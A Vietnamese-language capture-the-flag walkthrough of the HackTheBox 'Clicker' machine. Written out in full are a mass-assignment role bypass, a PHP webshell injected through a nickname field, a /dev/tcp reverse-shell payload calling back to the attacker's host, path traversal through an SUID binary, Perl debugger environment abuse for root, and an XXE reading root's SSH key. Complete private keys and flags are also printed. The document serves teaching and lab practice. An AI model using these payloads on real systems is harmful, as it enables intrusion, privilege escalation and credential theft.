---
title: 
draft: false
tags:
  - linux
  - medium
  - perl5
---
# Describe
Clicker is a Medium Linux box featuring a Web Application hosting a clicking game. Enumerating the box, an attacker is able to mount a public NFS share and retrieve the source code of the application, revealing an endpoint susceptible to SQL Injection. Exploiting this vulnerability, an attacker can elevate the privileges of their account and change the username to include malicious PHP code. Accessing the admin panel, an export feature is abused to create a PHP file including the modified username, leading to arbitrary code execution on the machine as www-data. Enumeration reveals an SUID binary that can access files under the home folder of the user jack. By performing a path traversal attack on the binary, the attacker is able to get the SSH key of jack, who is allowed to run a monitoring script with arbitrary environment variables with sudo. The monitoring script expects a response to a curl request in XML format. The attacker, by setting the http_proxy variable, is able to intercept and alter the response to the script, in order to include an XXE payload to read the SSH key of the root user. Finally, the attacker is able to use the SSH key and get access as the root user on the remote machine.

# Recon

## Nmap:

```jsx
Starting Nmap 7.94SVN ( <https://nmap.org> ) at 2025-01-24 09:51 CST
Nmap scan report for 10.129.183.204
Host is up (0.0087s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
2049/tcp open  nfs
```

## NFS
- Có port NFS là một port dùng để share file. Sử dụng showmount để xem folder được share: `showmount -e 10.129.183.204`

```jsx
Export list for 10.129.183.204:
/mnt/backups *
```

→ Bây giờ ta sẽ mount với thư mục trên máy mình:

```jsx
showmount -e <IP>

mkdir /mnt/new_back
mount -t nfs 10.12.0.150:/backup /mnt/new_back -o nolock
```
![[Pasted image 20250127220113.png]]
# Exploit Application
→ Down file zip về máy đây chính là code backup của ứng dụng.
![[Pasted image 20250127220130.png]]
→ Bây giờ có code của ứng dụng rồi, bây giờ xem ứng dụng có gì:
![[Pasted image 20250127220142.png]]
- Sau khi khám phá ứng dụng thì sau khi Register và Login thì thực hiện Play game sau đó lưu lại thì gọi tới request save_game
![[Pasted image 20250127220154.png]]
- Vào thực hiện check code của code này:

```php
<?php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
	$args = [];
	foreach($_GET as $key=>$value) {
		if (strtolower($key) === 'role') {
			// prevent malicious users to modify role
			header('Location: /index.php?err=Malicious activity detected!');
			die;
		}
		$args[$key] = $value;
	}
	save_profile($_SESSION['PLAYER'], $_GET);
	// update session info
	$_SESSION['CLICKS'] = $_GET['clicks'];
	$_SESSION['LEVEL'] = $_GET['level'];
	header('Location: /index.php?msg=Game has been saved!');
	
}
?>
```

→ Ứng dụng có thực hiện check tham số role → check vào function save_profile:

```jsx
function save_profile($player, $args) {
	global $pdo;
  	$params = ["player"=>$player];
	$setStr = "";
  	foreach ($args as $key => $value) {
    		$setStr .= $key . "=" . $pdo->quote($value) . ",";
	}
	
  	$setStr = rtrim($setStr, ",");
  	$stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
  	$stmt -> execute($params);
}
```

## Mass Assignment
→ Từ đây ta thấy tại endpoint này đang có lỗi Mass Assignment khi ứng dụng cho phép update các thông tin của player thông qua endpoint save_game.php. Ví dụ bây giờ ta thực hiện update thêm nickname kèm với số click và level.
![[Pasted image 20250127220210.png]]
- Bypasss việc ngăn chặn cập nhật role bằng -> %0a -> \n 
![[Pasted image 20250301154556.png]]
![[Pasted image 20250301154656.png]]
-> Login lại và được quyền Admin
- Khám phá các chức năng trong Admin thì tháy có chức năng xuất report
![[Pasted image 20250301155729.png]]
- Chức năng có 2 tham số trong đó có tham số extension sẽ là định dạng file xuất ra. Đổi thành php thành công
![[Pasted image 20250301160026.png]]
- Xem lại code xử lý của endpoint này. Ta thấy nội dung file sẽ thực hiện nối chuổi với các thông tin của người dùng như nickname, click, level.
![[Pasted image 20250301160250.png]]
-  Xem xét các tham số thì ta thấy có tham số nickname thì có thể lợi dụng để chèn đoạn code php và khi thực hiện export dạng php thì code sẽ được thực thi như một webshell.
![[Pasted image 20250301161517.png]]
- Chạy thành công phpinfo().
![[Pasted image 20250301161457.png]]
# Get www-data
-> Chèn đoạn code reverse shell để thực thi : ``<%3fphp+exec("/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.62/3344+0>%261'")%3b+%3f>``
```http
GET /save_game.php?clicks=90000000&level=1&nickname=test132<%3fphp+exec("/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.62/3344+0>%261'")%3b+%3f> HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=e27u6uirhl14g5ke8r63dq3tn1
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```
-> thực hiện export với php để thực thi payload
```http
POST /export.php HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://clicker.htb
Connection: keep-alive
Referer: http://clicker.htb/admin.php
Cookie: PHPSESSID=e27u6uirhl14g5ke8r63dq3tn1
Upgrade-Insecure-Requests: 1
Priority: u=0, i

threshold=1000000&extension=php
```
```
 C:\Users\nguye>ncat -lnvp 3344
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:3344
Ncat: Listening on 0.0.0.0:3344
Ncat: Connection from 10.129.79.22:38272.
bash: cannot set terminal process group (1210): Inappropriate ioctl for device
bash: no job control in this shell
www-data@clicker:/var/www/clicker.htb/exports$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@clicker:/var/www/clicker.htb/exports$
```
-> Success reverse shell 
Bây giờ ta ta đi tìm flag nhưng ta chỉ còn quyền www-data khi đến nơi lưu flag jack thì không có quyền:![[Pasted image 20250302102218.png]]
# Get user jack
- Buộc ta phải leo quyền ta cần kiếm một file có quyền SETUID = s để có thể lợi dụng:  
```bash
www-data@clicker:/$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
/usr/sbin/mount.nfs
/opt/manage/execute_query
```
- Trong đó có file /opt/manage/execute_query.
- ![[Pasted image 20250322211334.png]]
- thử chạy file đó thì thấy file này có thể in ra các câu lệnh sql 
![[Pasted image 20250302103441.png]]
- bây giờ sẽ copy file đó về máy để phân tích. Ban đầu tôi thực hiện sẽ reverse shell nội dụng file về file trên máy của tôi. nhưng điều này không thành công bởi vì file kia là file binary reverse file về sẽ bị lỗi. Sau khi chat vs GPT để tìm một phương án để copy file execute_query đúng. Thì biết là chuyển file dạng base64 rồi copy về lại máy và chuyển về lại file binary. Amazing good job :) 
```
www-data@clicker:/opt/manage$ base64 execute_query
base64 execute_query
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAgBEAAAAAAABAAAAAAAAAADA4AAAAAAAAAAAAAEAAOAAN
AEAAHwAeAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA2AIAAAAAAADYAgAAAAAAAAgA
AAAAAAAAAwAAAAQAAAAYAwAAAAAAABgDAAAAAAAAGAMAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
AAAAAAABAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAIAAAAAAAAUAgAAAAAAAAAEAA
....
```
- Copy về máy và chuyển lại thui
```
ubuntu@m41n:~/HTB$ nano execute_query.b64
ubuntu@m41n:~/HTB$ base64 -d execute_query.b64 > execute_query
ubuntu@m41n:~/HTB$ ls
execute_query  execute_query.b64
ubuntu@m41n:~/HTB$
```
- Lấy file ra và đưa vào IDA Pro để phân tích. cùng xem hàm main :
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  size_t v4; // rbx
  size_t v5; // rax
  size_t v6; // rbx
  size_t v7; // rax
  int v8; // [rsp+10h] [rbp-B0h]
  char *dest; // [rsp+18h] [rbp-A8h]
  char *name; // [rsp+20h] [rbp-A0h]
  char *command; // [rsp+28h] [rbp-98h]
  char s[32]; // [rsp+30h] [rbp-90h] BYREF
  char src[88]; // [rsp+50h] [rbp-70h] BYREF
  unsigned __int64 v14; // [rsp+A8h] [rbp-18h]

  v14 = __readfsqword(0x28u);
  if ( argc > 1 )
  {
    v8 = atoi(argv[1]);
    dest = (char *)calloc(0x14uLL, 1uLL);
    switch ( v8 )
    {
      case 0:
        puts("ERROR: Invalid arguments");
        return 2;
      case 1:
        strncpy(dest, "create.sql", 0x14uLL);
        goto LABEL_10;
      case 2:
        strncpy(dest, "populate.sql", 0x14uLL);
        goto LABEL_10;
      case 3:
        strncpy(dest, "reset_password.sql", 0x14uLL);
        goto LABEL_10;
      case 4:
        strncpy(dest, "clean.sql", 0x14uLL);
        goto LABEL_10;
      default:
        strncpy(dest, argv[2], 0x14uLL);
LABEL_10:
        strcpy(s, "/home/jack/queries/");
        v4 = strlen(s);
        v5 = strlen(dest);
        name = (char *)calloc(v4 + v5 + 1, 1uLL);
        strcat(name, s);
        strcat(name, dest);
        setreuid(0x3E8u, 0x3E8u);
        if ( access(name, 4) )
        {
          puts("File not readable or not found");
        }
        else
        {
          strcpy(src, "/usr/bin/mysql -u clicker_db_user --password='clicker_db_password' clicker -v < ");
          v6 = strlen(src);
          v7 = strlen(dest);
          command = (char *)calloc(v6 + v7 + 1, 1uLL);
          strcat(command, src);
          strcat(command, name);
          system(command);
        }
        result = 0;
        break;
    }
  }
  else
  {
    puts("ERROR: not enough arguments");
    return 1;
  }
  return result;
}
```
- IDA công cụ reverse rất mạnh mẽ nên ta cũng đã thấy rõ các hàm trong file binary. Từ đó biết được đường dẫn để các tên .sql thực thi là: ==/home/jack/queries/==
- Sau khi đọc code thì ta thấy có một điểm quan trong chỗ command sql ![[Pasted image 20250322233925.png]]
- Có tham số -v : là tham số này sẽ hiển thị chi tiết của command sql đang chạy -> sẽ hiện ra nội dụng của câu lệnh. Điều này có nghĩa là khi ta đưa một file sql vào sẽ thực hiện chạy và hiển thị nội dung file đó chạy như thế nào ra. Thử lợi dụng nó để đọc file /etc/passwd nào.
- Thực hiện chạy fine execute_query với tham số bất kì cùng với file dest là file /etc/passwd: 
```
www-data@clicker:/opt/manage$ ./execute_query 12 ../../../etc/passwd
./execute_query 12 ../../../etc/passwd
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
jack:x:1000:1000:jack:/home/jack:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
_rpc:x:115:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:116:65534::/var/lib/nfs:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```
-  Thực hiện đọc flag 1 thui trong thư mục jack thui. Vì hiện tại ta đang đọc file ở /home/jack/queries nên ta chỉnh cần ../flag.txt
![[Pasted image 20250322235938.png]]
:))) có lẽ không có quyền đọc. Vậy bây giờ ta cần chiếm tài khoản jack này thì mới truy cập được. Sau khi tìm hiểu qua cuộc trò chuyện với người bạn thân tên G** thì ta có thể xem các file nhạy cảm của jack dưới quyền của jack như:
![[Pasted image 20250323000133.png]]
- Thực hiện đọc file thì đọc được file ../.ssh/id_rsa :)))
```
www-data@clicker:/opt/manage$ ./execute_query 12 ../.ssh/id_rsa
./execute_query 12 ../.ssh/id_rsa
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAs4eQaWHe45iGSieDHbraAYgQdMwlMGPt50KmMUAvWgAV2zlP8/1Y
J/tSzgoR9Fko8I1UpLnHCLz2Ezsb/MrLCe8nG5TlbJrrQ4HcqnS4TKN7DZ7XW0bup3ayy1
kAAZ9Uot6ep/ekM8E+7/39VZ5fe1FwZj4iRKI+g/BVQFclsgK02B594GkOz33P/Zzte2jV
Tgmy3+htPE5My31i2lXh6XWfepiBOjG+mQDg2OySAphbO1SbMisowP1aSexKMh7Ir6IlPu
nuw3l/luyvRGDN8fyumTeIXVAdPfOqMqTOVECo7hAoY+uYWKfiHxOX4fo+/fNwdcfctBUm
pr5Nxx0GCH1wLnHsbx+/oBkPzxuzd+BcGNZp7FP8cn+dEFz2ty8Ls0Mr+XW5ofivEwr3+e
30OgtpL6QhO2eLiZVrIXOHiPzW49emv4xhuoPF3E/5CA6akeQbbGAppTi+EBG9Lhr04c9E
2uCSLPiZqHiViArcUbbXxWMX2NPSJzDsQ4xeYqFtAAAFiO2Fee3thXntAAAAB3NzaC1yc2
EAAAGBALOHkGlh3uOYhkongx262gGIEHTMJTBj7edCpjFAL1oAFds5T/P9WCf7Us4KEfRZ
KPCNVKS5xwi89hM7G/zKywnvJxuU5Wya60OB3Kp0uEyjew2e11tG7qd2sstZAAGfVKLenq
f3pDPBPu/9/VWeX3tRcGY+IkSiPoPwVUBXJbICtNgefeBpDs99z/2c7Xto1U4Jst/obTxO
TMt9YtpV4el1n3qYgToxvpkA4NjskgKYWztUmzIrKMD9WknsSjIeyK+iJT7p7sN5f5bsr0
RgzfH8rpk3iF1QHT3zqjKkzlRAqO4QKGPrmFin4h8Tl+H6Pv3zcHXH3LQVJqa+TccdBgh9
cC5x7G8fv6AZD88bs3fgXBjWaexT/HJ/nRBc9rcvC7NDK/l1uaH4rxMK9/nt9DoLaS+kIT
tni4mVayFzh4j81uPXpr+MYbqDxdxP+QgOmpHkG2xgKaU4vhARvS4a9OHPRNrgkiz4mah4
lYgK3FG218VjF9jT0icw7EOMXmKhbQAAAAMBAAEAAAGACLYPP83L7uc7vOVl609hvKlJgy
FUvKBcrtgBEGq44XkXlmeVhZVJbcc4IV9Dt8OLxQBWlxecnMPufMhld0Kvz2+XSjNTXo21
1LS8bFj1iGJ2WhbXBErQ0bdkvZE3+twsUyrSL/xIL2q1DxgX7sucfnNZLNze9M2akvRabq
DL53NSKxpvqS/v1AmaygePTmmrz/mQgGTayA5Uk5sl7Mo2CAn5Dw3PV2+KfAoa3uu7ufyC
kMJuNWT6uUKR2vxoLT5pEZKlg8Qmw2HHZxa6wUlpTSRMgO+R+xEQsemUFy0vCh4TyezD3i
SlyE8yMm8gdIgYJB+FP5m4eUyGTjTE4+lhXOKgEGPcw9+MK7Li05Kbgsv/ZwuLiI8UNAhc
9vgmEfs/hoiZPX6fpG+u4L82oKJuIbxF/I2Q2YBNIP9O9qVLdxUniEUCNl3BOAk/8H6usN
9pLG5kIalMYSl6lMnfethUiUrTZzATPYT1xZzQCdJ+qagLrl7O33aez3B/OAUrYmsBAAAA
wQDB7xyKB85+On0U9Qk1jS85dNaEeSBGb7Yp4e/oQGiHquN/xBgaZzYTEO7WQtrfmZMM4s
SXT5qO0J8TBwjmkuzit3/BjrdOAs8n2Lq8J0sPcltsMnoJuZ3Svqclqi8WuttSgKPyhC4s
FQsp6ggRGCP64C8N854//KuxhTh5UXHmD7+teKGdbi9MjfDygwk+gQ33YIr2KczVgdltwW
EhA8zfl5uimjsT31lks3jwk/I8CupZGrVvXmyEzBYZBegl3W4AAADBAO19sPL8ZYYo1n2j
rghoSkgwA8kZJRy6BIyRFRUODsYBlK0ItFnriPgWSE2b3iHo7cuujCDju0yIIfF2QG87Hh
zXj1wghocEMzZ3ELIlkIDY8BtrewjC3CFyeIY3XKCY5AgzE2ygRGvEL+YFLezLqhJseV8j
3kOhQ3D6boridyK3T66YGzJsdpEvWTpbvve3FM5pIWmA5LUXyihP2F7fs2E5aDBUuLJeyi
F0YCoftLetCA/kiVtqlT0trgO8Yh+78QAAAMEAwYV0GjQs3AYNLMGccWlVFoLLPKGItynr
Xxa/j3qOBZ+HiMsXtZdpdrV26N43CmiHRue4SWG1m/Vh3zezxNymsQrp6sv96vsFjM7gAI
JJK+Ds3zu2NNNmQ82gPwc/wNM3TatS/Oe4loqHg3nDn5CEbPtgc8wkxheKARAz0SbztcJC
LsOxRu230Ti7tRBOtV153KHlE4Bu7G/d028dbQhtfMXJLu96W1l3Fr98pDxDSFnig2HMIi
lL4gSjpD/FjWk9AAAADGphY2tAY2xpY2tlcgECAwQFBg==
-----END OPENSSH PRIVATE KEY---
--------------

```
- Yeah !!! Đã có key thì ssh vào thôi. 
![[Pasted image 20250323005414.png]]
- Lấy flag 1 thôi: 
```
jack@clicker:~$ cat user.txt
de0799c252ec85a5ffd4e1c85d4ba16f
```
# Get Root
- sudo -l:
```r
jack@clicker:~$ sudo -l
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
```
- Tìm thấy được một file người dùng có thể chạy với quyền root : /opt/monitor.sh
```c
jack@clicker:~$ cat /opt/monitor.sh
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```
- Trong đoạn code có truy cập tới URL diagnostic.php thử gửi request và thấy trả về các thông tin của máy chủ: 
![[Pasted image 20250323013523.png]]
- Đọc code file này thử :
```php
www-data@clicker:/var/www/clicker.htb$ cat diagnostic.php
cat diagnostic.php
<?php
if (isset($_GET["token"])) {
    if (strcmp(md5($_GET["token"]), "ac0e5a6a3a50b5639e69ae6d8cd49f40") != 0) {
        header("HTTP/1.1 401 Unauthorized");
        exit;
        }
}
else {
    header("HTTP/1.1 401 Unauthorized");
    die;
}

function array_to_xml( $data, &$xml_data ) {
    foreach( $data as $key => $value ) {
        if( is_array($value) ) {
            if( is_numeric($key) ){
                $key = 'item'.$key;
            }
        $subnode = $xml_data->addChild($key);
        array_to_xml($value, $subnode);
        } else {
            $xml_data->addChild("$key",htmlspecialchars("$value"));
        }
        }
}

$db_server="localhost";
$db_username="clicker_db_user";
$db_password="clicker_db_password";
$db_name="clicker";

$connection_test = "OK";

try {
        $pdo = new PDO("mysql:dbname=$db_name;host=$db_server", $db_username, $db_password, array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
} catch(PDOException $ex){
    $connection_test = "KO";
}
$data=[];
$data["timestamp"] = time();
$data["date"] = date("Y/m/d h:i:sa");
$data["php-version"] = phpversion();
$data["test-connection-db"] = $connection_test;
$data["memory-usage"] = memory_get_usage();
$env = getenv();
$data["environment"] = $env;

$xml_data = new SimpleXMLElement('<?xml version="1.0"?><data></data>');
array_to_xml($data,$xml_data);
$result = $xml_data->asXML();
print $result;
?>
```
Thử chạy file monitor.sh
```xml
jack@clicker:/opt$ ./monitor.sh
Error, please run as root
jack@clicker:/opt$ sudo ./monitor.sh
<?xml version="1.0"?>
<data>
  <timestamp>1742668650</timestamp>
  <date>2025/03/22 06:37:30pm</date>
  <php-version>8.1.2-1ubuntu2.14</php-version>
  <test-connection-db>OK</test-connection-db>
  <memory-usage>392704</memory-usage>
  <environment>
    <APACHE_RUN_DIR>/var/run/apache2</APACHE_RUN_DIR>
    <SYSTEMD_EXEC_PID>1172</SYSTEMD_EXEC_PID>
    <APACHE_PID_FILE>/var/run/apache2/apache2.pid</APACHE_PID_FILE>
    <JOURNAL_STREAM>8:25284</JOURNAL_STREAM>
    <PATH>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</PATH>
    <INVOCATION_ID>6773b4dc066a48a1b431741c895f2e10</INVOCATION_ID>
    <APACHE_LOCK_DIR>/var/lock/apache2</APACHE_LOCK_DIR>
    <LANG>C</LANG>
    <APACHE_RUN_USER>www-data</APACHE_RUN_USER>
    <APACHE_RUN_GROUP>www-data</APACHE_RUN_GROUP>
    <APACHE_LOG_DIR>/var/log/apache2</APACHE_LOG_DIR>
    <PWD>/</PWD>
  </environment>
</data>
```
## PATH 1: PERL DEBUG
- Sau khi đọc 2 code của 2 file ta thấy file monitor.sh có sự góp mặt của biến môi trường của Perl. Check version của Perl trên server ![[Pasted image 20250323014600.png]]
- Vì Perl đang nằm trong biến môi trường mà đoạn code monitor.sh có thực hiện code perl với quyền Root nên sẽ lợi dụng Perl Debug để thực thi lệnh với quyền root như một POC : https://www.exploit-db.com/exploits/39702 . Tại đay ứng dụng chạy lệnh PERL để leo quyền: ![[Pasted image 20250323014821.png]]
- Thử dùng payload này để thực hiện chạy command :`ERL5OPT=-d PERL5DB='exec "touch test"' /opt/monitor.sh` với quyền root thông qua file monitor.sh. tạo file test với quyền root thành công.
```bash
jack@clicker:/opt$ sudo PERL5OPT=-d PERL5DB='exec "touch test"' /opt/monitor.sh
Statement unlikely to be reached at /usr/bin/xml_pp line 9.
        (Maybe you meant system() when you said exec()?)
jack@clicker:/opt$ ls
manage  monitor.sh  test
jack@clicker:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Mar 22 18:52 .
drwxr-xr-x 18 root root 4096 Sep  5  2023 ..
drwxr-xr-x  2 jack jack 4096 Jul 21  2023 manage
-rwxr-xr-x  1 root root  504 Jul 20  2023 monitor.sh
-rw-r--r--  1 root root    0 Mar 22 18:52 test
```
- Đọc các file trên thư mục /root thấy được flag đặt trong file root.txt
```bash
jack@clicker:/opt$ sudo PERL5OPT=-d PERL5DB='exec "ls /root > test"' /opt/monitor.sh
Statement unlikely to be reached at /usr/bin/xml_pp line 9.
        (Maybe you meant system() when you said exec()?)
jack@clicker:/opt$ cat test
diagnostic_files
restore
root.txt
jack@clicker:/opt$ sudo PERL5OPT=-d PERL5DB='exec "cat /root/root.txt > get_flag"' /opt/monitor.sh
Statement unlikely to be reached at /usr/bin/xml_pp line 9.
        (Maybe you meant system() when you said exec()?)
jack@clicker:/opt$ cat get_flag
daf60f4adde14a8f23cde98e7cb4e1bf
```
## PATH 2: XXE
- Ta thấy trong file monitor.sh có sử dụng lệnh curl gửi tới một URL. nên ta có thể lợi dụng một flag http_proxy để khi chạy file này thì lệnh curl sẽ được trỏ qua một proxy. ý tưởng giờ ta sẽ cho nó trỏ qua máy của attacker :))
- Chỉnh proxy burp bắt trên 8080
![[Pasted image 20250323020423.png]]
- Thử `sudo http_proxy=http://10.10.14.41:8080 /opt/monitor.sh`
![[Pasted image 20250323021027.png]]
```xml
jack@clicker:/opt$ sudo http_proxy=http://10.10.14.41:8080 /opt/monitor.sh
<?xml version="1.0"?>
<!DOCTYPE replace [
<!ENTITY ent SYSTEM "/etc/passwd">
]>
<file>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
jack:x:1000:1000:jack:/home/jack:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
_rpc:x:115:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:116:65534::/var/lib/nfs:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

</file>
```
Lấy SSH key 
![[Pasted image 20250323021230.png]]
Lấy được key; 
```xml
jack@clicker:/opt$ sudo http_proxy=http://10.10.14.41:8080 /opt/monitor.sh
<?xml version="1.0"?>
<!DOCTYPE replace [
<!ENTITY ent SYSTEM "/root/.ssh/id_rsa">
]>
<file>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmQBWGDv1n5tAPBu2Q/DsRCIZoPhthS8T+uoYa6CL+gKtJJGok8xC
lLjJRQDm4w2ixTHuh2pt9wK5e4Ms77g310ffneCiRtxmfciYTO84U7NMKaA4z3YoupdWwF
oINQ9UwCIiv8q7bnRfq5tGYVutxgFUKX5blZjAqRRbBrRmtEW35blQ6dB2yYL+erUR/u26
PI6Ydwj1216lUF6p0opnzOQ6VPO5Fp0hSx7LnPa2AoTDuj122gKayeSeiV+hd6tQN/dt+q
kEuRIQw6SpjN0INSLdKtH8lrbkOqB4TKvg3a3Iq7ocxJVs5UNDZlh3+7R6lwOH2iL4r1Tf
o//IJqkisM/H7dUUHPI6xGgOfXxSx4j6/pj+YZDqONy2iZuQPZq3jj5KGGQbEOspIZXiKm
dPVpRwILFmOeTxI2T5wi3jErfHCGhcjOu/bLzrwpbZuOxWB1aw58F3xBSShmj1Monzrfb8
